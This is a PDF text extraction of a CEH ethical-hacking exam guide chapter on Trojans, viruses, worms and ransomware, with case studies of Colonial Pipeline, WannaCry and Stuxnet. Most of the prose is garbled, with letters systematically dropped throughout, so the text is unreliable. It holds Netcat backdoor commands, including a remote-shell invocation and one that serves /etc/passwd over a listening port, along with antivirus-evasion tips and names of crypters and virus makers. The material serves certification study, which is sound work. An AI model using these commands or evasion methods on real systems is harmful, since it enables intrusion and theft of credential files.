I red soewhere tht softwre is considered to be lwre bsed on the perceived
intent of the cretor rther thn on ny prticulr fetures. Tht’s ctully  good wy to
think of it fro the ethicl hcking perspective. Wheres ost people think of viruses,
wors, nd Trojns s  ens to spred destruction nd s  huge inconvenience to
coputing life, to n ethicl hcker the Trojn ight ctully look like  good ens
to pull off  successful exploit or to retin ccess to  chine—it’s siply one of ny
tools in the rsenl. Additionlly, there re  ton of “legitite” pplictions, dd-ons,
toolbrs, nd the like tht ren’t intended to be lwre but y s well be. For exple,
is “steling” dt for dvertising purposes lwre in nture?

And wht bout intent s seen fro the eye of n nti-lwre (lso known s nti-
virus, AV) ppliction? Netct is routinely flgged s lwre, even though ll it does is
open nd close ports. There re countless tools nd exples like tht. Perhps the best

10-ch10.indd 372 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

373

wy to think of intent regrding lwre is tht lost no tool is inherently evil—it’s the
opertor tht kes it so. Tht sid, there re soe tool types tht re clssified s lwre
fro the get-go, nd lthough we’ll void the in-depth inutie tht’s sure to bore you
into dropping this undertking ltogether nd send you screing into nother voction,
we will spend  little tie on the highlights of Trojns, viruses, wors, nd the like.

In the current version of the officil coursewre, it ppers tht EC-Council hs tken
 jor shift fro requiring eoriztion of the little detils regrding Trojn nd virus
neskes nd definitions to focusing on wht ctully kes up lwre. So before we get
into concepts, nlysis, nd itigtions, let’s puse for just  second to go over soe lwre
coponent definitions you’ll need to know. This prticulr list doesn’t include every single
vrint in the lwre world—soe y use ll or only soe of the entire list—nd I’
certin soething is out there in the lwre nlysis nd forensics world tht will be left
out of here, but we’ll stick with the study teril nd go fro there:

• Malicious code A cond tht delinetes the bsic functionlity of the
lwre (for exple, steling dt)

• Payload A piece of softwre llowing control over the trget fter exploittion,
or perforing the intended ction of the ttcker

• Exploit The code tht tkes dvntge of syste vulnerbilities to ccess dt
or instll lwre

• Injector An ppliction tht injects its own code into running processes to lter
execution (lso used in hiding nd reovl prevention)

• Downloader A Trojn tht downlods other lwre fro n Internet
connection (instlled by n ttcker fter ccess to help with intining ccess)

• Dropper A Trojn type tht instlls other lwre on the coproised
syste covertly

• Obfuscator A licious progr tht couflges its code nd intended
purpose

Regrdless of whether or not  tool type is clssified s lwre, there needs to be 
wy to distribute the lwre nd get it instlled on chines. After ll, surely no one
purposefully clicks soething tht sys “Click here for the ltest lwre infection on
your chine! Gurnteed not to be noticed by your current AV signtures! Hurry, this
is  liited-tie offer!” (Although soeties it certinly sees tht people do.) No,
lwre cretors need to resort to other ens to distribute their work, nd it’s usully
through innocent-ppering ens.

EC-Council defines seven different ethods ttckers use to distribute lwre.
Most of the re firly strightforwrd nd esy to identify. Methods include malvertis-
ing (ebedding lwre stright into those nnoying d networks you see popping up
onscreen everywhere), drive-by downloads (which exploit flws in the browser softwre
itself to instll lwre siply by visiting  pge), nd compromised legitimate sites (led-
ing to infections on visiting systes). And don’t forget good-old socil engineering;
distribution ethods here include clickjacking (isleding users into clicking  pge

10-ch10.indd 373 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

374

tht looks innocent enough, but holds lwre redy to go) nd SPAM e-mails (the old
tried-nd-true ethod of putting lwre s n ttchent to n e-il nd getting
the trget to click it). Finlly, Black Hat Search Engine Optimization (SEO) cn be used
to rnk lwre sites higher in serch engine results, nd spear phishing sites cn be used
to iic uthentic businesses, llowing the theft of credentils.

The bsolute esiest wy you cn get  trget to instll your lwre, thereby provid-
ing you with ccess to their chine, is to just sk the to do it for you. Trnsit l-
wre (usully  Trojn) vi e-il, file shring, or  browser nd, ore often thn not,
the trget will open it nd hppily instll whtever you wnt. Of course, the e-il cn’t
sy “Click this so I cn infect nd own your syste,” nd your ebedded lwre ust
be hidden enough so s not to trip ny AV signtures. So the question becoes, then,
how do you ke lwre look like  legitite ppliction? Well, there re  couple of
options vilble for you.

EXAM TIP Overt channels are legitimate communication channels used by
programs across a system or a network, whereas covert channels are used to
transport data in unintended ways.

First, wrappers re progrs tht llow you to bind n executble of your choice
(Trojn) to n innocent file your trget won’t ind opening. For exple, you ight use 
progr such s EliteWrp to ebed  bckdoor ppliction with  ge file (.exe). Your
trget opens the ltest version of Elf Bowling (I love ebedding old references to keep
our tech editor used) nd strts rolling strikes. Menwhile, your bckdoor is instlling
nd sits there witing for your use lter. Wrppers do hve their own signtures nd cn
definitely show up on AV scns. If you’ve wrpped 20 ites, you’d wind up with  single
lwre discovery in your nti-lwre.

EXAM TIP Another wrapper option is using the IExpress Wizard. IExpress.exe
is part o Windows deployments since 2000.

Assuing you’ve found  wy to get User Joe to open files you send hi, it’s nother
thing ltogether to bypss the nti-lwre syste on his chine. After ll, wht good
does it do to find  hpless user clicking on everything you send hi, only to hve ech
ttept qushed by the nti-lwre? Packers nd crypters re two ethods tht cn help
with this. They re tools tht lter lwre to hide it fro signture-bsed nti-lwre.

Crypters re softwre tools tht use  cobintion of encryption nd code nipul-
tion to render lwre undetectble to AV nd other security-onitoring products (in
Internet lingo, it’s referred to s fud, for “fully undetectble”). Packers use copression to
pck the lwre executble into  sller size. While this does reduce the file size, it lso
serves to ke the lwre hrder to detect for soe nti-lwre engines. Both crypters
nd pckers work uch like  ZIP file, except tht the extrction occurs in eory nd
not on the disk. There re severl crypters out there, but be forewrned—delving into this
stuff cn tke you to soe relly drk plces on the interwebs. ECC entions severl in
the coursewre, soe of which include BitCrypter (https://www.crypter.co/), CypherX
Crypter (https://cypherxcrypter.en.softonic.co/), nd SwyzCryptor (GitHub).

10-ch10.indd 374 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

375

EXAM TIP There are speciic actions you can take to evade AV on a system
you’re trying to inect. A ew examples include breaking your Trojan into
multiple segments and zipping them into a single ile, converting an
executable to VB script, and changing ile extensions to match a known ile
type other than .exe. You can also use a hex editor to change the checksum
or a ile. And don’t orget encryption!

And finlly, keep in ind the exploit kits. There re tons of pltfors fro which
you cn deliver exploits nd pylods, nd ny re used pririly to deploy Trojns on
trget systes. Soe exples include Infinity, Bleeding Life, Criepck, nd Blckhole
Exploit Kit.

Trojans
A Trojan is softwre tht ppers to perfor  desirble function for the user prior to run-
ning or instlling it but insted perfors  function, usully without the user’s knowledge,
tht stels infortion or otherwise hrs the syste (or dt). To hckers—ethicl or
not— Trojan is  ethod to gin, nd intin, ccess on  trget chine.

The ide of  Trojn is pretty siple. First, send n innocent-looking file to your
trget, inviting the to open it. They open it nd, unwre to wht’s going on, errily
instll softwre tht kes your job esier. This softwre ight be designed to stel spe-
cific types of infortion to send bck, ct s  keylogger, or perfor 1000 other eqully
devious tsks. Soe Trojns cn even provide reote control–type ccess to  hcker
ny tie he feels like it. For us ethicl hckers, the ultite gol is to provide soething
we cn go bck to lter— ens to intin our ccess. Although  bckdoor isn’t 
Trojn, nd  Trojn isn’t  bckdoor, they’re tied together in this discussion nd on your
ex: the Trojn is the ens of delivery, nd the bckdoor provides the open ccess.

There re innuerble Trojns, nd uses for the, in the coputing world tody. In
CEH prlnce, they’ve been ctegorized into different groups, ech firly esy to under-
stnd without uch coent or explntion on y prt. For exple, I’ firly certin
you could understnd tht  Trojn tht chnges the title br of n Excel spredsheet
to red “YOU’VE BEEN HACKED!” would fll into the defacement Trojan ctegory, s
opposed to the proxy server Trojan, which llows n ttcker to use the trget syste s
 proxy. Others include botnet Trojans (like Tor-bsed ChewBcc nd Skynet), remote
access Trojans (like RAT, MoSucker, Optix Pro, nd Blckhole), nd e-banking Trojans
(like Zeus nd SpyEye).

A command shell Trojan is intended to provide  bckdoor to the syste tht you
connect to vi cond-line ccess. An exple used by EC-Council in the pst is
Netct—nd lthough ll the purists out there re screing “Netct is not  Trojn!”
just ber with e for  inute. I discuss Netct here inly to illustrte  point I de
erlier. Going bck to our discussion on intent, Netct is s uch of  Trojn s I 
 professionl bsketbll plyer, but it does provide  ens to open nd close listen-
ing ports—in effect providing  ethod to bckdoor your wy into  syste. In nd of
itself, opening nd closing ports doesn’t see licious t ll, but dd licious intent
to it nd Netct’s sttus isn’t so cler-cut.

10-ch10.indd 375 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

376

NOTE Have I mentioned the joy o trying to ind something in 916 pages o
oicial courseware with no index? It’s a hoot. However, I just reviewed the
courseware and, as ar as I can tell, Netcat isn’t mentioned (unlike in prior
versions). At all. That is almost a crime, but I’m leaving my Netcat writeup in
here anyway because I suspect you may see it on your exam anyway.

Known s the “Swiss Ary knife” of TCP/IP hcking, Netct provides ll sorts of
control over  reote shell on  trget (see Figure 10-1). For exple, to estblish
cond-line ccess to the chine, type nc -e IPaddress Port#. Tired of Telnet? Just
type the -t option. And for the in point of this section (bckdoor ccess to  chine),
when instlled nd executed on  reote chine, Netct opens  listening port of your
choice. Fro your ttck chine, you connect using the open port—nd voilà! For
exple’s ske, typing nc -l -p 5555 opens port 5555 in  listening stte on the trget
chine. You cn then type nc IPaddress -p 5555 nd connect to the trget chine—
rw “Telnet-like” connection. And, just for fun, do you think the following cond
ight provide soething interesting (ssuing we’re connecting to  Linux box)?

nc –l –p 5555 < /etc/passwd

NOTE Netcat can be used or outbound or inbound connections, over
TCP or UDP, to or rom any port on the machine. It oers DNS orwarding,
port mapping and orwarding, and proxying. You can even use it as a port
scanner i you’re really in a bind.

And finlly in our discussion of Trojns, we hve to include port nuber coprisons
through both rel-world, norl discussion nd ECC-world “this will probbly be on
your ex” lenses s well. Defult port nubers used by specific Trojns ost definitely
fll into the rel of “not rel world,” but will no doubt pper on your ex. Soe of
the ore coon port nubers used by vrious Trojns re shown in Tble 10-1, nd
for test purposes you should definitely know the. To be copletely honest, though,
these ports nubers won’t be of vlue to you in the rel world— rel hcker siply
won’t bother with protocols you’re going to be wtching for. For exple, port 21 y

Figure 10-1
Netcat help

10-ch10.indd 376 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

377

Trojan Name Port Trojan Name Port

Emotet 20/22/80/443 Bionet, MagicHound 6667/12349

Dark FTP 21 GateCrasher 6969

EliteWrap 23 Remote Grab 7000

Mspy 68 ICKiller 7789

Ismdoor, Poison Ivy, 80 Zeus, Shamoon 8080
powerstats

WannaCry, Petya 445 BackOriice 2000 8787/54321

njRAT 1177 Del 10048

DarkComet, Pandora RAT 1604 Git 10100

SpySender 1807 Senna Spy 11000

Xtreme 1863 Progenic Trojan 11223

Deep Throat 2140/3150/6670/6671 Hack 99 Keylogger 12223

Spygate/Punisher RAT 5000 Evil FTP 23456

Blade Runner 5400–02 Back Oriice 1.20/ 31337, 31338
Deep BO

Killer, Houdini 6666 Devil 65000

Table 10-1 Trojan Port Numbers

be the defult for n FTP server, but severl known Trojns ke use of it for illicit pur-
poses. And port 80, for HTTP trffic? Plese—don’t get e strted. To quote our tech
editor, “Any lwre tht doesn’t use TLS over 443, DNS over 53, or soe other esy-to-
hide echnis ws likely written by 14-yer-olds who hte their prents or by hckers
living in soe country where using  486DX (yes, tht DX, with the th co-processor)
to code is still stte of the rt.”

You’ll definitely see soe of these port nubers on your ex, but in ctul prctice
 hcker is not going to just blst forwrd with  sign reding “I’ here to hck you.”
Nor will he use soe ridiculously ned thing like “Whck  Mole.” In fct, if you’re
chsing soething down on these defult nubers in the rel world, soebody hs done
soething wrong, or you’re being set up.

EXAM TIP Notice anything interesting about the port numbers chart?
Anything jump out at you? How about “normal” assigned port numbers,
such as ports 80, 443, and 445, being used or something they weren’t
intended to be used or? Remember (and don’t worry, I’ll mention it again
and again) on your exam a port number is tied to an application, but in the
real world a port number can be used or whatever you want it to be used for.

So, whether you’re lzily checking for defult port nubers or legititely concerned
bout wht is ctully being used on your syste, how would you spot port usge?
By looking for it, of course. Severl progrs re vilble to keep n eye on the port
nubers you hve in use on your syste. An old stndby built into your Windows

10-ch10.indd 377 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

378

syste cond line is netstt. Entering the cond netstat -an will show you ll the
connections nd listening ports in nuericl for, s shown in Figure 10-2.

The netstt output shows ll connections in one of severl sttes—everything fro
SYN_SEND (indicting ctive open) to CLOSED (the server hs received n ACK
fro the client nd closed the connection). In Figure 10-2, you cn see severl port
nubers in  LISTENING stte—witing for soething to coe long nd sk for
the to open. Another useful netstt cond is netstat -b. This displys ll ctive
connections nd the processes or pplictions tht re using the, which is pretty vlu-
ble infortion in ferreting out spywre nd lwre.

Also, port-scnning tools cn ke the tsk esier for you. CurrPorts is  tool fro
Nirsoft (https://www.nirsoft.net/utils/cports.htl) tht reports ll open TCP/IP nd
UDP ports nd ps the to the owning pplictions. Infortion bout the process
tht opened the port is lso displyed, including the process ne, full pth of the process,
version infortion of the process, the tie tht the process ws creted, nd the user tht
creted it. In ddition, CurrPorts llows you to close unwnted TCP connections, kill the
process tht opened the ports, nd sve the TCP/UDP ports infortion to n HTML
file, XML file, or tb-deliited text file. CurrPorts lso utoticlly rks suspicious
TCP/UDP ports owned by unidentified pplictions for you.

Figure 10-2
Using netstat
to discover
port usage

10-ch10.indd 378 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

379

NOTE Process Explorer is a ree tool rom Windows Sysinternals (https://
docs.microsot.com/sysinternals/) that comes highly recommended. It
can tell you almost anything you’d want to know about a running process.
Another ree Microsot oering ormerly rom SysInternals is AutoRuns. It is
without question one o the better tools or iguring out what runs at startup
on your system.

If you’re on  Windows chine, you’ll lso wnt to keep n eye on the registry,
drivers, nd services being used, s well s your strtup routines. When it coes to the
registry, you cn try to onitor it nully, but I bet within  dy you’d be reduced to
 blubbering fool curled into the fetl position in the corner. It’s fr esier to use oni-
toring tools designed for just tht purpose. Soe of the options re SysAnlyzer, Tiny
Wtcher, Active Registry Monitor, nd Regshot. Additionlly, ny nti-lwre nd
lwre scnners will wtch out for registry errors. Mlwrebytes will disply ll ques-
tionble registry settings it finds on  scn, for exple.

EXAM TIP Windows automatically runs everything located in Run,
RunServices, RunOnce, and RunServicesOnce, and you’ll ind that most
questions on the exam are centered on or show you settings rom HKEY_
LOCAL_MACHINE.

Services nd processes you don’t recognize or tht see to be cting out of sorts cn
be indictors of Trojn ctivity on  chine. Aside fro old, relible Tsk Mnger,
processes nd services cn be onitored using gobs of different tools. Just  few en-
tioned for your perusl re Windows Service Mnger, Service Mnger Plus, nd Srt
Utility. And don’t forget to check the strtup routines, where ost of these services nd
processes will be present; it won’t do you uch good to identify  bd service or process
nd kill it, only to hve it pop up gin t the next strt. On  pre–Windows 10 chine,
 siple sconfig cond opens the Syste Configurtion window showing you ll
sorts of strtup (nd other) settings you cn work with (see Figure 10-3; on Windows 10
the Strtup tb is prt of Tsk Mnger)

Viruses and Worms
The good news regrding viruses nd wors is there’s not  whole lot here for you to
reeber for your ex, nd wht you do need to know re siple definitions nd 
few new, newsworthy ttcks. There’s siply not  lot on the ex regrding lwre s
 whole, so I’ll try to keep it short, sweet, nd right to the point.

A virus is  self-replicting progr tht reproduces its code by ttching copies into
other executble codes. In other words, viruses crete copies of theselves in other
progrs, then ctivte on soe sort of trigger event (such s  specific user tsk, 
prticulr tie, or n event of soe sort). They usully get instlled on  syste vi file
ttchents, user clicks on ebedded e-ils, or the instlltion of pirted softwre,
nd while soe viruses re nothing ore thn just nnoynces, ny cuse substntil
hr to the syste nd finncil loss to the syste owner.

10-ch10.indd 379 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

380

Figure 10-3 System Coniguration window (accessed via msconig)

NOTE A really audacious method or getting viruses onto a system is
known as virus hoax or fake anti-malware. The process involves letting a
target know about a terrible virus running rampant through the world and
then providing them an anti-malware program (or signature ile) to protect
themselves with. Don’t laugh. It works.

Assuing your syste does get infected, other thn your AV going bnns nd lert-
ing tht soething crzy hs hppened, just how would you know your syste hs ctu-
lly been infected? Well, obvious things like uch slower response tie, coputer nd
browser freezes, nd repeted, continul hrd drive ccesses should be indictors. Others
y not be s ieditely obvious—for exple, drive letters ight chnge nd files
nd folders y dispper or becoe inccessible. In ny event, recovery y be s
siple s  inor clening effort using softwre designed to clen the infection, or it y
be  jor undertking tht includes relods fro known good bckups.

NOTE Want to make your own virus, or whatever reason? Some options
or you are Sonic Bat, PoisonVirus Maker, Sam’s Virus Generator, and JPS
Virus Maker.

The officil coursewre lists ultiple virus types, but there’s not  lot of eoriz-
tion needed for ny of the—s stted erlier in the chpter, EC-Council sees to hve
oved wy fro expecting rote eoriztion. One in prticulr, though, does get 

10-ch10.indd 380 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

381

lot of ttention nd thus wrrnts soe extr ttention here: rnsowre. According
to US-CERT, rnsowre is  type of licious softwre designed to deny ccess to 
coputer syste or dt until  rnso is pid, nd typiclly spreds through phishing
e-ils or by unknowing visits to n infected website. In other words, rnsowre locks
you out of your own syste resources nd dends n online pyent of soe sort in
order to relese the bck to you. While usully the pyent is sller thn the cost it
would tke to reove the lwre nd recover nything lost, soeties it’s enorous,
nd pying off the bd guys siply brings bout ore online terror.

What Would You Do?
Igine with e for  oent. Close your eyes nd put yourself in the shoes of n
opertions supervisor heding into work on  Fridy. You’ve coe in erly, s usul,
becuse you genuinely enjoy your work, nd it’s  stisfying feeling knowing your
opertions hven’t seen  significnt interruption of service for 57 yers. Mybe you
hve big weekend plns, nd n esy dy t the office sounds like  gret led-in to
 couple dys off.

You grb  cup of coffee nd sit down behind your wll of onitors to strt the
business dy. It’s My 7, just before 5:00 a.m. CST, nd the phone rings.

Curious—since these clls don’t norlly strt this erly in the orning—you
look t the cller ID nd notice it’s fro the billing deprtent. Answering the
phone you her n excited, perplexed, worried voice sy, “The screen here is disply-
ing  rnso note—soething bout if we don’t py they won’t relese our dt.”
The other lines strt lighting up, nd you receive ore reports fro billing deprt-
ent folks looking t rnso screens.

Wht would you do?
The scenrio bove is rel. True. Hppened lost exctly s I described (sve for

the liberty tken with weekend plns nd coffee—I en, I hd to ke it interest-
ing). And lthough y question, “Wht would you do?” sees siple, it’s ctully
very coplicted, especilly when you’re sitting there with ll those lines lighting
up. On one hnd, you know soething is iss—there’s no doubt the systes re
under ttck nd, given ll the news hedlines bout recent high-profile ttcks
(including the 2020 SolrWinds hck tht hit ultiple federl governent gen-
cies), you’re probbly wre it’s serious nd even probbly wre it’s clled rnso-
wre. On the other, we’re tlking bout fifty-seven years without  hlt in delivery,
not to ention 45 percent of the entire Est Cost will go fro full to zero cpcity
in seconds. Tht kind of decision king, tht kind of pressure, is  tough burden
to crry. So it would hve been understndble if the opertions nger hd tken
soe tie to consider ll of it. Insted, he cted. Swiftly.

By 6:10 a.m. CST, opertions nger de the decision nd ll ction hd been
tken: Colonil Pipeline copletely shut down ll opertions.

I’d like to sy I’d do the se thing, but honestly I’ not sure. By ll ccounts
(i.e., wht infortion I cn find on it thus fr) the ttck only ffected Colonil

(continued )

10-ch10.indd 381 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

382

Pipeline’s bility to bill clients—nothing on the ctul opertions side of the floor
ws coproised—so shutting down opertions ust hve tken soe...courge.
Perhps this nger knew he hd the bcking of his ledership. Perhps the entire
copny hd  strong security culture (ore on tht in  second). Or perhps co-
pny couniction, policy, nd procedure ws so cler nd swift this ws n esy
cll. In ny cse, fro  pure security perspective, I slute the effort.

So how’d this ll hppen in the first plce? Tht ppers urky, s conflicting
detils fro “trusted sources” hve been flying since the news hit the wires. Ini-
tilly, probbly due in lrge prt to ssuption, it ws reported the rnsowre
ws injected vi  phishing cpign. Others reported  crefully executed socil
engineering effort. One report bled n inside thret ctor lone cused it.

The ost plusible of the “wht hppened” reports I’ve red bles  siple set
of stolen credentils s the point of entry. There re  couple pieces of evidence tht
point to this. First, while no one is bsolutely certin of exctly how the credentils
were stolen,  set of VPN ccount credentils were discovered fter the fct inside
 btch of leked psswords on the drk web, indicting tht perhps n eployee
used the se pssword on nother ccount tht ws previously hcked. Second,
the VPN ccount in question ws not ctively in use during the ttck tiefre
but hd not yet been disbled. Cobine tht with the fct tht the copny VPN
did not ipleent ultifctor uthentiction, nd…the ttckers siply logged in
with  coproised userne nd pssword.

Finlly, the fterth itself provided credence to the theory. Chrles Crkl,
senior vice president t cybersecurity fir Mndint, sid in n interview fter the
ttck news hit, “We did  pretty exhustive serch of the environent to try nd
deterine how they ctully got those credentils. We don’t see ny evidence of
phishing for the eployee whose credentils were used. We hve not seen ny other
evidence of ttcker ctivity before April 29.”

As to who did this nd why, nobody relly hs the full nswer—or, t lest,
nobody who knows is telling the public. However, the populr nswer to tht points
to  cybercriinl hcking group believed to be bsed in Estern Europe tht trgets
victis using rnsowre nd extortion clled “DrkSide.” Agin, there’s no public
confirtion, but there is  little evidence: on My 9, just two dys fter the ttck,
 stteent relesed fro the DrkSide group sid, “...our gol is to ke oney,
nd not creting probles for society.”

Additionl confirtion coes fro the old dge, “Follow the oney.” With
the ssistnce of the FBI, Colonil pid 75 bitcoin (nerly $4.4 illion t the tie)
within hours fter the ttck, nd the ttckers returned keys to restore Colonil’s
network. Interestingly, on June 7 the Deprtent of Justice nnounced tht it hd
recovered 63.7 bitcoins fro the rnso pyent, with the FBI confiring the
use of  privte key for the rnso ccount. While using this privte key did llow
recovery of uch of the bitcoin rnso, the FBI did not disclose how it obtined
the privte key.

Did the ttckers provide the key to the FBI out of hunitrin concern? Ws
the ttck unintended in rech, s the DrkSide stteent suggests? Unfortuntely,
we’ll probbly never know, but it sure kes for good reding.

10-ch10.indd 382 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

383

Rnsowre s  ter seeingly ce out of nowhere  few yers go, but is now 
dointing focus of ttention nd converstion in the security world. Unfortuntely, it’s
ubiquitous nd there’s little doubt you’ll see it soewhere, soetie in your trvels. As 
tter of fct, I’ betting ost of you reding this hve t lest  cursory knowledge of
possibly the ost fous, nd ost “effective,” rnsowre ttck in history—WnnCry.

On My 12, 2017,  syste in Asi ws the first to fll victi to the WnnCry rn-
sowre. Within 24 hours, it hd spred to over 230,000 chines in 150 countries
by tking dvntge of n unptched SMB exploit known s “Eternl Blue.” In Eternl
Blue, Microsoft’s ipleenttion of SMBv1 ishndled specilly crfted trgets, which
llowed reote ttckers to execute code on the chine. Interestingly enough, the Eter-
nl Blue exploit ws, by ll ccounts, discovered by the NSA nd relesed to Microsoft
for ptch cretion in erly Mrch of the se yer. Microsoft did indeed crete the ptch
nd de it vilble in April, but ny orgniztions—for resons involving everything
fro tiing issues, ptch ngeent policies (the ptch ws not rked s “criticl”),
testing nd evlutions, nd, yes, even lzy security ipleenttion—did not hve it in
plce to prevent the exploit.

EXAM TIP The ransomware “amily” includes examples such as Dharma,
eCh0raix (targeting Linux devices with QNAP NAS), and SamSam (uses
RSA-2048 asymmetric encryption). Some others o note include CryptorBit,
CryptoLocker, CryptoDeense, and Petya (a close cousin o WannaCry that
spread using the Windows Management Instrumentation command line).

Should Make Us All Want to Cry
WnnCry ws n ttck with worldwide iplictions nd devsttion tht should
never have been allowed to succeed. The ttck cobined  known nd highly pub-
licized exploit (which ws utoted to be  wor) nd rnsowre tht would
encrypt files nd dend bitcoin s pyent for the encryption keys. Despite the
fct the exploit ws well known nd  ptch ws redily vilble for syste din-
istrtors, WnnCry still nged to be the ost successful rnsowre vrint
on record. And wht’s relly hrd to believe is it ws poised to hve  uch ore
devstting effect, if it were not for  resercher who stubled into  itigtion tht
stopped the propgtion nd execution of the lwre.

Upon initil infection, WnnCry would execute two coponents—one tht
would ttept to exploit  known SMB vulnerbility nd one tht hd the rnso-
wre. The dropper would ttept to cll out to doins nd, if successful (tht is,
if the doin it reched out to ws vlid), would stop. Assuing  doin ws not
reched, it would then chnge registry keys, crete services, nd encrypt files (chng-
ing their extensions to .WNCRY). The encrypted files would be inccessible to the
users, nd the chnge to the registry keys would disply  essge indicting wht
the rnso ws to get the key to decrypt the files. Menwhile, the service tht ws
creted ws used to spred vi SMB to other vulnerble systes the coputer could

(continued )

10-ch10.indd 383 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

384

ccess (it scnned fro n infected coputer for connections nd systes tht were
still vulnerble to this exploit, nd when one ws discovered, the weponized exploit
would run nd gin reote code execution on the next chine).

A few dys fter the initil outbrek,  British security resercher (Mrcus
Hutchins, k “MlwreTech”) looked t the doin ne the lwre would
query for, nd he discovered two iportnt fcts. First, the ne ws hrdcoded into
the exploit itself, nd, second, the doin itself ws unregistered. He quickly regis-
tered the doin nd set up  sinkhole server, which effectively stopped WnnCry
fro copleting full execution of the rnsowre nd spreding. Unbeknownst to
hi, he hd stopped the wor in its trcks—so uch so tht those reserching the
lwre could not execute it.

So, in effect, we were witness to  well-known exploit being weponized ginst
 bunch of chines tht filed to ipleent  ptch creted to ddress it. And on
top of tht, the fix ction to puse it in plce ws stubled upon by  resercher who
hiself would lter be rrested in Ls Vegs on ten federl chrges relted to hcking
nd lwre dispersl (ccused of creting nd selling the Kronos lwre vrint
in 2014, ong other chrges, he ccepted  ple del of tie served nd  one yer
probtion). It’s enough to ke you wnn cry.

By the wy, if you’re curious to see how t lest prts of this ttck worked,
both n Np script nd  Metsploit odule exist. On  syste you own or one
you hve pprovl to scn nd ttck, the Np script smb-vuln-ms17-010 will
scn to see if it is vulnerble (lso ening the pproprite ptches hve not been
pplied). If you re ble to use ctive exploits on the test network or chine, you
cn use Metsploit odule MS17-010 for reote code execution on chines tht
re unptched.

Another lwre definition you’ll need to know is the wor. A worm is  self-
replicting lwre coputer progr tht uses  coputer network to send copies of
itself to other systes without hun intervention. Usully it doesn’t lter files, but it
resides in ctive eory nd duplictes itself, eting up resources nd wreking hvoc
long the wy. The ost coon use for  wor in the hcking world is the cretion of
botnets, which we’ve lredy discussed in previous chpters. This ry of robot systes
cn then be used to ccoplish ll sorts of bd things.

When it coes to wors nd your ex, in erlier versions of the ex EC-Council
wnted you not only to know nd understnd wht  wor does but lso to identify
specific fous ned wors bsed on  vriety of chrcteristics. This go-round, the
topic is ore or less entioned in pssing, with just  few exples (onero, bondt, nd
bepy) nd  brief ention of wor kers (Internet Wor Mker Thing, Btch Wor
Genertor, nd C++ Wor Genertor) closing things out.

10-ch10.indd 384 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

385

A Nuclear Worm
If I were to tell everyone to stop wht they were doing, close their eyes, nd describe
to e wht the cretor of  wor or virus looks like, I bet the responses would
be pretty esy to predict—ngry dolescent wnting soe notoriety, ntion-stte
ctors, or spy gencies. But, in fct, one of the ost fous nd ost dging
wors in the history of the Internet ws creted by the U.S. governent. At lest
it llegedly ws, becuse lthough everything I’ bout to write ctully hppened,
no one hs ever coe out nd cknowledged it officilly.

In 2006, the U.S. governent, working with Isreli llies, decided to pursue 
“cyberdisruption” cpign ied t crippling Irn’s nucler fcilities. The ide ws
siple: p out  plnt’s functions, crete  trget vector by using this infortion,
nd strt rndo, untrceble ttcks to cripple the infrstructure the plnt relied
on. The wor, probbly introduced vi n unsuspecting plnt eployee nd  USB
stick, did precisely tht nd trgeted centrifuges inside Irnin plnts, king the
spin too quickly or too slowly. Within  week or so, the wor successfully shut down
roughly one-fifth of the centrifuges the nucler plnt relied on to function nd set
the Irnin nucler progr bck significntly. It then orphed nd oved on to
other ttck vectors, iicking echnicl filures, flsifying live sttus reporting,
nd frustrting efforts to bring the entire plnt, nd syste, bck to functionlity.

The proble ws, the dirty little wor didn’t sty where it ws supposed to sty.
Apprently n engineer t the Ntnz plnt took n infected chine hoe nd
connected it to the Internet. Stuxnet, s it ce to be known, ws now replicting
cross the Internet, nd its code ws exposed for public investigtion. While this ct
rked the beginnings of the spred, USB drives turned out to be one of the ost,
if not the ost, criticl ethods erly on in spreding Stuxnet s fr s it went. Lter
vrints, creted when hckers got hold of the code nd went crzy with it, used
ny other ethods to spred.

So, how did the wor escpe the specific re the cretors intended it to sty in?
Tht hs been  point of debte ever since it went public. Mny security copnies
hve tken prt the code nd exined it to figure out who de the progr-
ing error tht resulted in it leping to the public doin. To y knowledge, no
one hs ever been ble to deterine who de the istke. A couple of things cn
be noted for certin, however. Stuxnet code is still being orphed, updted, nd
reprogred for present nd future ttcks. And soe of those ttcks re, nd
will no doubt be, ginst the very governents responsible for creting it.

Fileless Malware
A brnd new entry in CEH study teril, fileless lwre (ironiclly lso known s
non-lwre) is given ultiple pges in the coursewre. However, the definition pro-
vided doesn’t see (to e nywy) to clerly identify it prt fro ny other lwre.

10-ch10.indd 385 14/09/21 4:03 PM



